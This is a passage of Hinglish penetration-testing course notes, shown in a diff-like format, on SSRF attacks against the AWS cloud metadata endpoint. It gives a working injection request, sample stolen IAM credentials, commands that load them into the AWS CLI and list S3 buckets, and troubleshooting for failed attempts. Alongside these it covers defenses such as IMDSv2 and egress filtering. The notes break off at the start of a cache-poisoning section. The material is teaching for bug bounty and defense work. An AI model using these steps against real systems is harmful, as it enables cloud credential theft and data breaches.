-[[HL::5. **Privilege Escalation:** Attacker in tokens ko apne local terminal mein configure karke cloud-native APIs ke through backend resources (S3, EC2) access karta hai.::HL]]
+1. **Request Injection:** Attacker vulnerable API parameter (e.g., `url=http://169.254.169.254/...`) mein cloud metadata IP bhejta hai.
+2. **Server-Side Fetch:** Cloud mein hosted API server is IP pe request bhejta hai. Yeh IP cloud VMs ke liye ek special hardcoded IP hoti hai jo unke apne metadata aur roles return karti hai.
+3. **Token Generation:** Cloud provider (like AWS) ek temporary **STS Token** (Security Token Service — temporary credentials) generate karke server ko wapas bhejta hai.
+4. **Data Reflection:** Vulnerable API in tokens ko attacker ki screen (Burp Suite) pe reflect kar deti hai.
+5. **Privilege Escalation:** Attacker in tokens ko apne local terminal mein configure karke cloud-native APIs ke through backend resources (S3, EC2) access karta hai.
 
-[[HL::### 💻 7. Hands-On — Lab-Ready Commands::HL]]
+### 💻 7. Hands-On — Lab-Ready Commands
 
-[[HL::**Step 1: Extracting AWS IAM Tokens via SSRF (Burp Suite Repeater):**::HL]]
+**Step 1: Extracting AWS IAM Tokens via SSRF (Burp Suite Repeater):**
 
-[[HL::```http::HL]]
-[[HL::# Burp Suite | HTTP Request::HL]]
-[[HL::1 GET /api/fetch_preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role HTTP/1.1  # url parameter mein AWS metadata endpoint inject kiya; admin-role victim ke IAM role ka naam hai::HL]]
-[[HL::2 Host: target-api.com::HL]]
+```http
+# Burp Suite | HTTP Request
+1 GET /api/fetch_preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role HTTP/1.1  # url parameter mein AWS metadata endpoint inject kiya; admin-role victim ke IAM role ka naam hai
+2 Host: target-api.com
 
-[[HL::```::HL]]
+```
 
-[[HL::```json::HL]]
-[[HL::# 📤 Expected Output (Burp Response):::HL]]
-[[HL::{::HL]]
-[[HL::  "Code" : "Success",::HL]]
-[[HL::  "LastUpdated" : "2024-05-15T12:00:00Z",::HL]]
-[[HL::  "Type" : "AWS-HMAC",::HL]]
-[[HL::  "AccessKeyId" : "ASIAV...[REDACTED]",::HL]]
-[[HL::  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",::HL]]
-[[HL::  "Token" : "IQoJb3JpZ2luX2VjE...[SUPER_LONG_SESSION_TOKEN]...",::HL]]
-[[HL::  "Expiration" : "2024-05-15T18:00:00Z"::HL]]
-[[HL::}::HL]]
+```json
+# 📤 Expected Output (Burp Response):
+{
+  "Code" : "Success",
+  "LastUpdated" : "2024-05-15T12:00:00Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAV...[REDACTED]",
+  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token" : "IQoJb3JpZ2luX2VjE...[SUPER_LONG_SESSION_TOKEN]...",
+  "Expiration" : "2024-05-15T18:00:00Z"
+}
 
-[[HL::```::HL]]
+```
 
-[[HL::**Step 2: Configuring Stolen Credentials Locally:**::HL]]
+**Step 2: Configuring Stolen Credentials Locally:**
 
-[[HL::```bash::HL]]
-[[HL::# Kali Linux | AWS CLI 2+::HL]]
-[[HL::1 aws configure  # aws configure = AWS command line tool setup karne ki command::HL]]
+```bash
+# Kali Linux | AWS CLI 2+
+1 aws configure  # aws configure = AWS command line tool setup karne ki command
 
-[[HL::```::HL]]
+```
 
-[[HL::*(Terminal prompt aayega, wahan upar mili values paste karo)*::HL]]
+*(Terminal prompt aayega, wahan upar mili values paste karo)*
 
-[[HL::```text::HL]]
-[[HL::# 📤 Expected Output:::HL]]
-[[HL::AWS Access Key ID [None]: ASIAV...[REDACTED]::HL]]
-[[HL::AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY::HL]]
-[[HL::Default region name [None]: us-east-1::HL]]
-[[HL::Default output format [None]: json::HL]]
+```text
+# 📤 Expected Output:
+AWS Access Key ID [None]: ASIAV...[REDACTED]
+AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+Default region name [None]: us-east-1
+Default output format [None]: json
 
-[[HL::```::HL]]
+```
 
-[[HL::**Step 3: Setting the STS Session Token (CRITICAL):**::HL]]
+**Step 3: Setting the STS Session Token (CRITICAL):**
 
-[[HL::```bash::HL]]
-[[HL::# Kali Linux | Terminal::HL]]
-[[HL::1 export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjE...[SUPER_LONG_SESSION_TOKEN]..."  # export = environment variable set karna; AWS_SESSION_TOKEN = temporary credentials use karne ke liye session token zaroori hai::HL]]
+```bash
+# Kali Linux | Terminal
+1 export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjE...[SUPER_LONG_SESSION_TOKEN]..."  # export = environment variable set karna; AWS_SESSION_TOKEN = temporary credentials use karne ke liye session token zaroori hai
 
-[[HL::```::HL]]
+```
 
-[[HL::```text::HL]]
-[[HL::# 📤 Expected Output: (koi output nahi — command successfully run ho gayi)::HL]]
+```text
+# 📤 Expected Output: (koi output nahi — command successfully run ho gayi)
 
-[[HL::```::HL]]
+```
 
-[[HL::**Step 4: Cloud Privilege Escalation (Accessing S3 Buckets):**::HL]]
+**Step 4: Cloud Privilege Escalation (Accessing S3 Buckets):**
 
-[[HL::```bash::HL]]
-[[HL::# Kali Linux | AWS CLI 2+::HL]]
-[[HL::1 aws s3 ls  # aws = tool name; s3 = service name; ls = list buckets::HL]]
+```bash
+# Kali Linux | AWS CLI 2+
+1 aws s3 ls  # aws = tool name; s3 = service name; ls = list buckets
 
-[[HL::```::HL]]
+```
 
-[[HL::```text::HL]]
-[[HL::# 📤 Expected Output:::HL]]
-[[HL::2024-01-10 10:00:00 company-public-assets::HL]]
-[[HL::2024-02-15 14:30:00 company-private-backups-db::HL]]
-[[HL::2024-03-20 09:15:00 customer-kyc-documents-confidential::HL]]
+```text
+# 📤 Expected Output:
+2024-01-10 10:00:00 company-public-assets
+2024-02-15 14:30:00 company-private-backups-db
+2024-03-20 09:15:00 customer-kyc-documents-confidential
 
-[[HL::```::HL]]
+```
 
-[[HL::#### 🛠️ Step-by-Step GUI Navigation (Burp to AWS CLI)::HL]]
+#### 🛠️ Step-by-Step GUI Navigation (Burp to AWS CLI)
 
-[[HL::1. **Burp Suite:** Request ko Repeater mein bhejo.::HL]]
-[[HL::2. Parameter mein `http://169.254.169.254/latest/meta-data/` daalo aur response check karo ki IAM role available hai ya nahi.::HL]]
-[[HL::3. Agar IAM role ka naam mile, toh path ke end mein us role ka naam append karo aur firse request bhejo JSON tokens lene ke liye.::HL]]
-[[HL::4. **Terminal:** `aws configure` type karke `AccessKeyId` aur `SecretAccessKey` daalo.::HL]]
-[[HL::5. Fir `export AWS_SESSION_TOKEN="..."` run karo. Ab tumhara local PC target server ki tarah act karega.::HL]]
+1. **Burp Suite:** Request ko Repeater mein bhejo.
+2. Parameter mein `http://169.254.169.254/latest/meta-data/` daalo aur response check karo ki IAM role available hai ya nahi.
+3. Agar IAM role ka naam mile, toh path ke end mein us role ka naam append karo aur firse request bhejo JSON tokens lene ke liye.
+4. **Terminal:** `aws configure` type karke `AccessKeyId` aur `SecretAccessKey` daalo.
+5. Fir `export AWS_SESSION_TOKEN="..."` run karo. Ab tumhara local PC target server ki tarah act karega.
 
-[[HL::### 🔒 8. Attack Surface & Defense::HL]]
+### 🔒 8. Attack Surface & Defense
 
-[[HL::**🔴 Attacker Perspective:** SSRF ka primary goal local files padhna nahi, balki cloud environments mein `169.254.169.254` hit karke AWS credentials nikalna aur S3 buckets ya database (DynamoDB) ko compromise karna hota hai.::HL]]
-[[HL::**🔵 Defender Perspective:** - AWS environment mein **IMDSv2** (Instance Metadata Service Version 2) enforce karo. IMDSv2 ke liye ek valid `PUT` request aur `X-aws-ec2-metadata-token` header zaroori hota hai, jo simple SSRF se bypass karna almost impossible hai.::HL]]
+**🔴 Attacker Perspective:** SSRF ka primary goal local files padhna nahi, balki cloud environments mein `169.254.169.254` hit karke AWS credentials nikalna aur S3 buckets ya database (DynamoDB) ko compromise karna hota hai.
+**🔵 Defender Perspective:** - AWS environment mein **IMDSv2** (Instance Metadata Service Version 2) enforce karo. IMDSv2 ke liye ek valid `PUT` request aur `X-aws-ec2-metadata-token` header zaroori hota hai, jo simple SSRF se bypass karna almost impossible hai.
 
-[[HL::* IAM roles ko least privilege par set karo taaki agar key leak bhi ho jaye, toh attacker S3 ya admin panel access na kar paaye.::HL]]
+* IAM roles ko least privilege par set karo taaki agar key leak bhi ho jaye, toh attacker S3 ya admin panel access na kar paaye.
 
-[[HL::### 🌍 9. Real-World Penetration Testing Use-Case::HL]]
+### 🌍 9. Real-World Penetration Testing Use-Case
 
-[[HL::Bug bounty programs (HackerOne, Bugcrowd) mein agar tum kisi API parameter (jaise `?image_url=` ya `?import_file=`) mein SSRF dhoondh lete ho aur wo AWS pe hosted hai, toh seedha metadata extract karo. Ek simple SSRF shayad $500 ki bounty de, par IAM tokens nikal kar "Full Cloud Takeover" dikhane par yahi bug $10,000+ (Critical P1) ka ho jata hai. Capital One ka famous data breach exact isi tarah ek WAF misconfiguration aur SSRF ke through AWS metadata leak se hua tha.::HL]]
+Bug bounty programs (HackerOne, Bugcrowd) mein agar tum kisi API parameter (jaise `?image_url=` ya `?import_file=`) mein SSRF dhoondh lete ho aur wo AWS pe hosted hai, toh seedha metadata extract karo. Ek simple SSRF shayad $500 ki bounty de, par IAM tokens nikal kar "Full Cloud Takeover" dikhane par yahi bug $10,000+ (Critical P1) ka ho jata hai. Capital One ka famous data breach exact isi tarah ek WAF misconfiguration aur SSRF ke through AWS metadata leak se hua tha.
 
-[[HL::### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)::HL]]
+### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)
 
-[[HL::* **❌ Mistake:** SSRF milne par sirf `http://localhost:22` ya `file:///etc/passwd` try karna aur cloud metadata check na karna.::HL]]
-[[HL::* **🤦 Why:** Beginners sochte hain ki SSRF sirf internal network scanner hai.::HL]]
-[[HL::* **✅ The 'Pro' Way:** Hamesha Wappalyzer se pehle tech stack check karo. Agar target cloud pe hai, toh AWS/Azure/GCP ke metadata IPs pehle try karo.::HL]]
-[[HL::* **⚡ Consequences:** Critical severity finding aur cloud compromise miss ho jayega, report low severity consider hogi.::HL]]
-[[HL::* **❌ Mistake:** Stolen IAM keys ko `aws configure` mein set karna, par `AWS_SESSION_TOKEN` export karna bhool jana.::HL]]
-[[HL::* **🤦 Why:** Temporary IAM roles (STS tokens) ke liye teeno cheezein chahiye hoti hain.::HL]]
-[[HL::* **✅ The 'Pro' Way:** `AccessKeyId`, `SecretAccessKey`, aur `Token` teeno ko set karo.::HL]]
-[[HL::* **⚡ Consequences:** `aws s3 ls` chalane pe "InvalidToken" error aayega aur attack fail ho jayega.::HL]]
+* **❌ Mistake:** SSRF milne par sirf `http://localhost:22` ya `file:///etc/passwd` try karna aur cloud metadata check na karna.
+* **🤦 Why:** Beginners sochte hain ki SSRF sirf internal network scanner hai.
+* **✅ The 'Pro' Way:** Hamesha Wappalyzer se pehle tech stack check karo. Agar target cloud pe hai, toh AWS/Azure/GCP ke metadata IPs pehle try karo.
+* **⚡ Consequences:** Critical severity finding aur cloud compromise miss ho jayega, report low severity consider hogi.
+* **❌ Mistake:** Stolen IAM keys ko `aws configure` mein set karna, par `AWS_SESSION_TOKEN` export karna bhool jana.
+* **🤦 Why:** Temporary IAM roles (STS tokens) ke liye teeno cheezein chahiye hoti hain.
+* **✅ The 'Pro' Way:** `AccessKeyId`, `SecretAccessKey`, aur `Token` teeno ko set karo.
+* **⚡ Consequences:** `aws s3 ls` chalane pe "InvalidToken" error aayega aur attack fail ho jayega.
 
-[[HL::### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)::HL]]
+### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)
 
-[[HL::* **Confusion 1 — "Kya `169.254.169.254` mere (attacker ke) computer ka IP hai?"**::HL]]
-[[HL::* **Galat soch:** Yeh koi local IP ya router ka IP hai.::HL]]
-[[HL::* **Actually:** Yeh ek link-local IP address hai jo AWS, Azure, aur GCP ne apne cloud machines ke internal use ke liye reserve kiya hai. Jab target server (cloud VM) is IP pe hit karta hai, toh cloud provider use uski khud ki details aur keys de deta hai.::HL]]
-[[HL::* **Prove karo:** Apne local Kali machine pe `curl http://169.254.169.254` run karke dekho. Connection timeout hoga kyunki tumhara PC cloud mein nahi hai.::HL]]
+* **Confusion 1 — "Kya `169.254.169.254` mere (attacker ke) computer ka IP hai?"**
+* **Galat soch:** Yeh koi local IP ya router ka IP hai.
+* **Actually:** Yeh ek link-local IP address hai jo AWS, Azure, aur GCP ne apne cloud machines ke internal use ke liye reserve kiya hai. Jab target server (cloud VM) is IP pe hit karta hai, toh cloud provider use uski khud ki details aur keys de deta hai.
+* **Prove karo:** Apne local Kali machine pe `curl http://169.254.169.254` run karke dekho. Connection timeout hoga kyunki tumhara PC cloud mein nahi hai.
 
 
-[[HL::* **Confusion 2 — "AWS aur Azure/GCP metadata URL mein kya fark hai?"**::HL]]
-[[HL::* **Galat soch:** IP same hai toh command bhi same hogi.::HL]]
-[[HL::* **Actually:** IP almost sabhi cloud providers ka same (`169.254.169.254`) hai, par path aur headers alag hote hain. Azure ke liye tumhe specific header (`Metadata: true`) bhejna padta hai.::HL]]
-[[HL::* **Prove karo:** Azure SSRF payload search karo: `http://169.254.169.254/metadata/instance?api-version=2017-08-01` with header `Metadata: true`.::HL]]
+* **Confusion 2 — "AWS aur Azure/GCP metadata URL mein kya fark hai?"**
+* **Galat soch:** IP same hai toh command bhi same hogi.
+* **Actually:** IP almost sabhi cloud providers ka same (`169.254.169.254`) hai, par path aur headers alag hote hain. Azure ke liye tumhe specific header (`Metadata: true`) bhejna padta hai.
+* **Prove karo:** Azure SSRF payload search karo: `http://169.254.169.254/metadata/instance?api-version=2017-08-01` with header `Metadata: true`.
 
 
-[[HL::* **Confusion 3 — "STS Token aur normal API Key mein kya farq hai?"**::HL]]
-[[HL::* **Galat soch:** Dono permanent password jaisa kaam karte hain.::HL]]
-[[HL::* **Actually:** AWS mein normal IAM keys permanent hoti hain, par cloud machines ko jo metadata service se milti hain (STS tokens) wo temporary hoti hain aur usually kuch ghanto mein expire ho jati hain.::HL]]
-[[HL::* **Prove karo:** Burp response mein JSON dekho, usme explicitly ek `Expiration` timestamp diya hota hai.::HL]]
+* **Confusion 3 — "STS Token aur normal API Key mein kya farq hai?"**
+* **Galat soch:** Dono permanent password jaisa kaam karte hain.
+* **Actually:** AWS mein normal IAM keys permanent hoti hain, par cloud machines ko jo metadata service se milti hain (STS tokens) wo temporary hoti hain aur usually kuch ghanto mein expire ho jati hain.
+* **Prove karo:** Burp response mein JSON dekho, usme explicitly ek `Expiration` timestamp diya hota hai.
 
 
 
-[[HL::### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)::HL]]
+### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)
 
-[[HL::* **`An error occurred (InvalidToken) when calling the ListBuckets operation`**::HL]]
-[[HL::* **Root Cause:** Tumne AWS CLI mein Access Key aur Secret Key daal di, par temporary session token set nahi kiya.::HL]]
-[[HL::* **Fix:** Terminal mein command run karo: `export AWS_SESSION_TOKEN="vo_lamba_token_jo_burp_se_mila_tha"`.::HL]]
+* **`An error occurred (InvalidToken) when calling the ListBuckets operation`**
+* **Root Cause:** Tumne AWS CLI mein Access Key aur Secret Key daal di, par temporary session token set nahi kiya.
+* **Fix:** Terminal mein command run karo: `export AWS_SESSION_TOKEN="vo_lamba_token_jo_burp_se_mila_tha"`.
 
 
-[[HL::* **`Burp shows 401 Unauthorized for 169.254.169.254 endpoint`**::HL]]
-[[HL::* **Root Cause:** Target AWS instance par IMDSv2 (Version 2) enforce kiya gaya hai jo bina valid `X-aws-ec2-metadata-token` header ke access block karta hai.::HL]]
-[[HL::* **Fix:** SSRF exploit is scenario mein IMDS ko hit nahi kar payega. Try exploiting SSRF to read local files or port scan the internal network instead.::HL]]
+* **`Burp shows 401 Unauthorized for 169.254.169.254 endpoint`**
+* **Root Cause:** Target AWS instance par IMDSv2 (Version 2) enforce kiya gaya hai jo bina valid `X-aws-ec2-metadata-token` header ke access block karta hai.
+* **Fix:** SSRF exploit is scenario mein IMDS ko hit nahi kar payega. Try exploiting SSRF to read local files or port scan the internal network instead.
 
 
-[[HL::* **`AccessDenied when running aws s3 ls`**::HL]]
-[[HL::* **Root Cause:** Tokens valid hain, par us IAM role (user) ke paas S3 bucket list karne ki permissions nahi hain (Least privilege applied).::HL]]
-[[HL::* **Fix:** Dusre services try karo jaise `aws iam get-user`, `aws ec2 describe-instances`, ya `aws sts get-caller-identity` permissions check karne ke liye.::HL]]
+* **`AccessDenied when running aws s3 ls`**
+* **Root Cause:** Tokens valid hain, par us IAM role (user) ke paas S3 bucket list karne ki permissions nahi hain (Least privilege applied).
+* **Fix:** Dusre services try karo jaise `aws iam get-user`, `aws ec2 describe-instances`, ya `aws sts get-caller-identity` permissions check karne ke liye.
 
 
 
-[[HL::### ⚖️ 13. Comparison (IMDSv1 vs IMDSv2)::HL]]
+### ⚖️ 13. Comparison (IMDSv1 vs IMDSv2)
 
-[[HL::| Feature | IMDSv1 (Vulnerable to SSRF) | IMDSv2 (Secure against SSRF) |::HL]]
-[[HL::| --- | --- | --- |::HL]]
-[[HL::| **Access Method** | Simple `GET` request se access ho jata hai. | Pehle ek special `PUT` request bhej ke token lena padta hai. |::HL]]
-[[HL::| **SSRF Exploitation** | Aasaan hai, basic URL inject karo aur keys le lo. | Extremely hard. Attacker ko SSRF ke thorough custom headers bhejne padenge. |::HL]]
-[[HL::| **Header Requirement** | Koi custom header nahi chahiye. | `X-aws-ec2-metadata-token` header mandatory hai. |::HL]]
+| Feature | IMDSv1 (Vulnerable to SSRF) | IMDSv2 (Secure against SSRF) |
+| --- | --- | --- |
+| **Access Method** | Simple `GET` request se access ho jata hai. | Pehle ek special `PUT` request bhej ke token lena padta hai. |
+| **SSRF Exploitation** | Aasaan hai, basic URL inject karo aur keys le lo. | Extremely hard. Attacker ko SSRF ke thorough custom headers bhejne padenge. |
+| **Header Requirement** | Koi custom header nahi chahiye. | `X-aws-ec2-metadata-token` header mandatory hai. |
 
-[[HL::### 🔄 14. Kill Chain & Attack Phase Flow::HL]]
+### 🔄 14. Kill Chain & Attack Phase Flow
 
-[[HL::* ⚔️ **Attack Phase:** Post-Exploitation / Privilege Escalation::HL]]
-[[HL::* 📍 **Kill Chain Position:** Weaponization ke baad. Initial foothold (SSRF) milne par attacker cloud environment mein privesc karta hai.::HL]]
-[[HL::* 🔗 **This connects to:** SSRF (Server-Side Request Forgery) -> Cloud Enumeration -> Data Exfiltration.::HL]]
-[[HL::* 🔄 **Flow:** Target identify AWS/Cloud hosted -> SSRF flaw exploit -> Hit `169.254.169.254` -> Steal STS IAM Tokens -> Configure AWS CLI locally -> S3/EC2 Takeover.::HL]]
+* ⚔️ **Attack Phase:** Post-Exploitation / Privilege Escalation
+* 📍 **Kill Chain Position:** Weaponization ke baad. Initial foothold (SSRF) milne par attacker cloud environment mein privesc karta hai.
+* 🔗 **This connects to:** SSRF (Server-Side Request Forgery) -> Cloud Enumeration -> Data Exfiltration.
+* 🔄 **Flow:** Target identify AWS/Cloud hosted -> SSRF flaw exploit -> Hit `169.254.169.254` -> Steal STS IAM Tokens -> Configure AWS CLI locally -> S3/EC2 Takeover.
 
-[[HL::### 🎨 15. Visual Diagram (ASCII Art — Attack Flow)::HL]]
+### 🎨 15. Visual Diagram (ASCII Art — Attack Flow)
 
-[[HL::```text::HL]]
-[[HL::[Attacker] ::HL]]
-[[HL::   │::HL]]
-[[HL::   │ 1. Inject: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/::HL]]
-[[HL::   ▼::HL]]
-[[HL::[Vulnerable API Server (AWS EC2)] ::HL]]
-[[HL::   │::HL]]
-[[HL::   │ 2. Fetch: Internal request to cloud IP::HL]]
-[[HL::   ▼::HL]]
-[[HL::[AWS Metadata Service (169.254.169.254)]::HL]]
-[[HL::   │::HL]]
-[[HL::   │ 3. Returns IAM STS tokens (Access Key, Secret, Session Token)::HL]]
-[[HL::   ▼::HL]]
-[[HL::[Vulnerable API Server]::HL]]
-[[HL::   │::HL]]
-[[HL::   │ 4. Reflects tokens back to attacker::HL]]
-[[HL::   ▼::HL]]
-[[HL::[Attacker] ---> Configures AWS CLI ---> Full Access to [AWS S3 Buckets / Cloud]::HL]]
+```text
+[Attacker] 
+   │
+   │ 1. Inject: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+   ▼
+[Vulnerable API Server (AWS EC2)] 
+   │
+   │ 2. Fetch: Internal request to cloud IP
+   ▼
+[AWS Metadata Service (169.254.169.254)]
+   │
+   │ 3. Returns IAM STS tokens (Access Key, Secret, Session Token)
+   ▼
+[Vulnerable API Server]
+   │
+   │ 4. Reflects tokens back to attacker
+   ▼
+[Attacker] ---> Configures AWS CLI ---> Full Access to [AWS S3 Buckets / Cloud]
 
-[[HL::```::HL]]
+```
 
-[[HL::### ❓ 16. Interview & Certification Exam Q&A::HL]]
+### ❓ 16. Interview & Certification Exam Q&A
 
-[[HL::* **Q: What is the significance of the IP address `169.254.169.254` in cloud environments?**::HL]]
-[[HL::* **A:** Yeh cloud providers (AWS, Azure, GCP) ke dwara use hone wala ek local link IP hai jo instances ko metadata service provide karta hai. Attacker SSRF ke through isse hit karke IAM roles aur temporary security credentials (STS tokens) steal kar sakte hain.::HL]]
+* **Q: What is the significance of the IP address `169.254.169.254` in cloud environments?**
+* **A:** Yeh cloud providers (AWS, Azure, GCP) ke dwara use hone wala ek local link IP hai jo instances ko metadata service provide karta hai. Attacker SSRF ke through isse hit karke IAM roles aur temporary security credentials (STS tokens) steal kar sakte hain.
 
 
-[[HL::* **Q: You extracted an Access Key, Secret Key, and Session Token via SSRF on AWS. How do you use them?**::HL]]
-[[HL::* **A:** Main `aws configure` run karke Access Key aur Secret Key set karunga. Phir session token ko use karne ke liye Linux terminal mein `export AWS_SESSION_TOKEN="<token_value>"` set karunga. Fir `aws s3 ls` jaisi commands chala kar enumerate karunga.::HL]]
+* **Q: You extracted an Access Key, Secret Key, and Session Token via SSRF on AWS. How do you use them?**
+* **A:** Main `aws configure` run karke Access Key aur Secret Key set karunga. Phir session token ko use karne ke liye Linux terminal mein `export AWS_SESSION_TOKEN="<token_value>"` set karunga. Fir `aws s3 ls` jaisi commands chala kar enumerate karunga.
 
 
-[[HL::* **Q: How does IMDSv2 mitigate the SSRF risk for AWS metadata?**::HL]]
-[[HL::* **A:** IMDSv2 ek session-oriented approach use karta hai jisme attacker ko metadata fetch karne se pehle ek `PUT` request bhejkar token obtain karna padta hai, aur agali request mein us token ko custom header mein include karna hota hai. Standard SSRF vulnerabilities usually custom headers ya `PUT` requests allow nahi karti hain, isliye IMDSv2 SSRF exploits ko rok deta hai.::HL]]
+* **Q: How does IMDSv2 mitigate the SSRF risk for AWS metadata?**
+* **A:** IMDSv2 ek session-oriented approach use karta hai jisme attacker ko metadata fetch karne se pehle ek `PUT` request bhejkar token obtain karna padta hai, aur agali request mein us token ko custom header mein include karna hota hai. Standard SSRF vulnerabilities usually custom headers ya `PUT` requests allow nahi karti hain, isliye IMDSv2 SSRF exploits ko rok deta hai.
 
 
-[[HL::* **Q: You get "InvalidToken" error when trying to list S3 buckets. Why?**::HL]]
-[[HL::* **A:** Metadata se mile credentials temporary STS tokens hote hain. Agar hum sirf `AccessKeyId` aur `SecretAccessKey` configure karein aur `AWS_SESSION_TOKEN` environment variable ko export karna bhool jayein, toh AWS in credentials ko reject kar dega.::HL]]
+* **Q: You get "InvalidToken" error when trying to list S3 buckets. Why?**
+* **A:** Metadata se mile credentials temporary STS tokens hote hain. Agar hum sirf `AccessKeyId` aur `SecretAccessKey` configure karein aur `AWS_SESSION_TOKEN` environment variable ko export karna bhool jayein, toh AWS in credentials ko reject kar dega.
 
 
-[[HL::* **Q: If a target is hosted on Azure, what extra requirement is needed to hit the metadata endpoint via SSRF?**::HL]]
-[[HL::* **A:** Azure instances ke metadata ko access karne ke liye SSRF attack mein ek mandatory HTTP header `Metadata: true` bhejna padta hai. Bina is header ke Azure metadata return nahi karega.::HL]]
+* **Q: If a target is hosted on Azure, what extra requirement is needed to hit the metadata endpoint via SSRF?**
+* **A:** Azure instances ke metadata ko access karne ke liye SSRF attack mein ek mandatory HTTP header `Metadata: true` bhejna padta hai. Bina is header ke Azure metadata return nahi karega.
 
 
-[[HL::* **Q: How can developers prevent Cloud Metadata SSRF besides upgrading to IMDSv2?**::HL]]
-[[HL::* **A:** Egress filtering lagani chahiye. API server ko internal network ya IP `169.254.169.254` par external user input ke through requests bhejne se explicitly deny firewall rule lagana chahiye.::HL]]
+* **Q: How can developers prevent Cloud Metadata SSRF besides upgrading to IMDSv2?**
+* **A:** Egress filtering lagani chahiye. API server ko internal network ya IP `169.254.169.254` par external user input ke through requests bhejne se explicitly deny firewall rule lagana chahiye.
 
 
-[[HL::* **Q: Does discovering an SSRF always guarantee cloud takeover?**::HL]]
-[[HL::* **A:** Nahi. SSRF 'blind' bhi ho sakta hai jahan data reflect nahi hota, ya phir AWS par IAM role properly scope down (least privilege) ho sakta hai jisse keys milne ke baad bhi koi dangerous actions perform na kiye ja sakein.::HL]]
+* **Q: Does discovering an SSRF always guarantee cloud takeover?**
+* **A:** Nahi. SSRF 'blind' bhi ho sakta hai jahan data reflect nahi hota, ya phir AWS par IAM role properly scope down (least privilege) ho sakta hai jisse keys milne ke baad bhi koi dangerous actions perform na kiye ja sakein.
 
 
 
-[[HL::### 📝 17. One-Line Memory Hook::HL]]
+### 📝 17. One-Line Memory Hook
 
-[[HL::**"Cloud mein SSRF matlab seedha `169.254.169.254` pe call ghumaao aur IAM tokens ka jackpot lo!"** (⭐ Instructor emphasized: SSRF in AWS = Metadata theft).::HL]]
+**"Cloud mein SSRF matlab seedha `169.254.169.254` pe call ghumaao aur IAM tokens ka jackpot lo!"** (⭐ Instructor emphasized: SSRF in AWS = Metadata theft).
 
-[[HL::### 🔑 18. Keywords Coverage Verification::HL]]
+### 🔑 18. Keywords Coverage Verification
 
-[[HL::```text::HL]]
-[[HL::🔑 Keywords Coverage Check — Cloud-Native API Risks (AWS/Azure/GCP)::HL]]
-[[HL::✅ Covered    : Cloud-native APIs, AWS metadata SSRF, `169.254.169.254`, Azure, GCP, IAM roles, security credentials, STS tokens, S3 bucket leakages, misconfigured permissions, cloud privilege escalation::HL]]
-[[HL::⚠️ Mentioned but needs more depth : (none)::HL]]
-[[HL::❌ MISSED     : (none)::HL]]
+```text
+🔑 Keywords Coverage Check — Cloud-Native API Risks (AWS/Azure/GCP)
+✅ Covered    : Cloud-native APIs, AWS metadata SSRF, `169.254.169.254`, Azure, GCP, IAM roles, security credentials, STS tokens, S3 bucket leakages, misconfigured permissions, cloud privilege escalation
+⚠️ Mentioned but needs more depth : (none)
+❌ MISSED     : (none)
 
-[[HL::```::HL]]
+```
 
-[[HL::> ✅ Verified: 100% keyword coverage achieved for this topic.::HL]]
+> ✅ Verified: 100% keyword coverage achieved for this topic.
 
-[[HL::---::HL]]
+---
 
-[[HL::### 🎯 2. API Cache Poisoning::HL]]
+### 🎯 2. API Cache Poisoning
 
-[[HL::Is topic mein hum seekhenge ki kaise web/API caching mechanisms (jaise Varnish ya Cloudflare) ki loopholes ko exploit karke ek attacker server ki cache ko "poison" kar deta hai. Isse normal users ko malicious content (jaise XSS payloads ya fake data) serve hota hai bina attacker ke unse directly interact kiye.::HL]]
+Is topic mein hum seekhenge ki kaise web/API caching mechanisms (jaise Varnish ya Cloudflare) ki loopholes ko exploit karke ek attacker server ki cache ko "poison" kar deta hai. Isse normal users ko malicious content (jaise XSS payloads ya fake data) serve hota hai bina attacker ke unse directly interact kiye.
 
-[[HL::### 🐣 2. Simple Analogy (Hinglish)::HL]]
+### 🐣 2. Simple Analogy (Hinglish)
 
-[[HL::Socho ek coffee shop ka menu board hai. Barista roz subah pichhe kitchen se (Origin Server) menu dekh ke board pe (Cache) likh deta hai taaki grahko ko jaldi order dene mein asani ho. Attacker subah sabse pehle aata hai aur chupke se kitchen se aane wale menu mein "Free Coffee for Attacker" likh deta hai. Barista yahi menu board pe likh deta hai. Ab din bhar jo bhi customer aayega (Normal Users), sabko board pe yahi malicious menu dikhega. Menu board ko kharab karna hi "Cache Poisoning" hai.::HL]]
+Socho ek coffee shop ka menu board hai. Barista roz subah pichhe kitchen se (Origin Server) menu dekh ke board pe (Cache) likh deta hai taaki grahko ko jaldi order dene mein asani ho. Attacker subah sabse pehle aata hai aur chupke se kitchen se aane wale menu mein "Free Coffee for Attacker" likh deta hai. Barista yahi menu board pe likh deta hai. Ab din bhar jo bhi customer aayega (Normal Users), sabko board pe yahi malicious menu dikhega. Menu board ko kharab karna hi "Cache Poisoning" hai.
 
-[[HL::### 📖 3. Technical Definition::HL]]
+### 📖 3. Technical Definition
 
-[[HL::* **Precise English:** Web Cache Poisoning occurs when an attacker exploits unkeyed parameters or HTTP headers to force a caching server (like Varnish or Cloudflare) to store a malicious response, which is then served to subsequent users requesting the same resource.::HL]]
-* [[HL::**Hinglish Simplification:** Jab hum server ke cache (fast memory) ko trick karke apna harmful data wahan save karwa dete hain, toh jab normal users wo URL kholte hain, unhe server ki jagah us cache se humara harmful data deliver hota hai.::HL]]
